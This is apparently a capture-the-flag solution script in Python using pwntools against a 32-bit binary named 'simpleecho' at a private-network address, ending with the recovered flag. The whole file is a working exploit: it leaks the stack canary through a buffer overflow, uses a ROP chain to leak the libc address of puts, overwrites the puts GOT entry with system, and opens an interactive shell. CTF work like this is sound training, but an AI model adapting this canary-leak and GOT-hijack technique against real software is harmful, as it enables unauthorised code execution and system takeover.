#!/usr/bin/env python
from pwn import *

r = remote('192.168.31.25',11005)
simpleecho = ELF('./simpleecho')
lib 	   = ELF('./libc.so.6-32')

#ANARY    : ENABLED
#FORTIFY   : disabled
#NX        : ENABLED
#PIE       : disabled
#RELRO     : Partial

# 0x8048644:  call   80484b0 <memset@plt>     buf size = 0x80
# ...
# 0x804866c:  call   0x8048420 <read@plt>     buf size = 0x100
# ...
# 0x804869c <main+223>:	call   0x8048440 <memcmp@plt>    compare input == 'exit'
# ...
# 0x80486b2 <main+245>:	mov    edx,DWORD PTR [esp+0x9c]	 input offset 0x80
# 0x80486b9 <main+252>:	xor    edx,DWORD PTR gs:0x14     check offset 0x80 with gs:0x14 --> input 0x80 is the stack guard
# 0x80486c0 <main+259>:	je     0x80486ee <main+305>      stack fail
# 0x80486c2 <main+261>:	jmp    0x80486e9 <main+300>	 nomal leave

# 0xffffd01c:	0x87bcdb00(stack guard)	0x080486f0	0x00000000	0x00000000
# 0xffffd02c:	0xf7e29af3(return address)    --> need junk*12 bytes


puts_plt = p32(simpleecho.plt['puts'])
puts_got = p32(simpleecho.got['puts'])
puts_lib = ''
read_plt = p32(simpleecho.plt['read'])
sys_got  = ''
pop1ret = p32(0x0804874f)
pop3ret = p32(0x0804874d)
bin_add = ''

# Step1 : get canary
r.readuntil(':')
r.send('A'*0x80 +'\n' )
res = r.readuntil(':')

guard = res.split('Input')[0].split('echo ')[1][0x81:0x84]
guard =  '\x00'+guard

# Step2 : Got hijecking
#                            junk between guard and return add
payload = 'A'*0x80 + guard + 'A'*12 
payload = payload + puts_plt + pop1ret + puts_got + read_plt + pop3ret + p32(0) + puts_got + p32(16) + puts_plt + 'A'*4 + p32(u32(puts_got)+0x4)
r.send(payload)

r.readuntil(':')
r.send('exit\n')
res = r.recvline() # output of goodbye~
res = r.recvline() # address of  puts	
puts_lib = u32(res[:4])
sys_got = p32( puts_lib - lib.symbols['puts'] + lib.symbols['system'] )

# for read in the payload
payload2 = sys_got + '/bin//sh\x00'
r.send(payload2)

r.interactive()

# AD{1_7h1nK_u_h4v3_l34n3d_R0p}
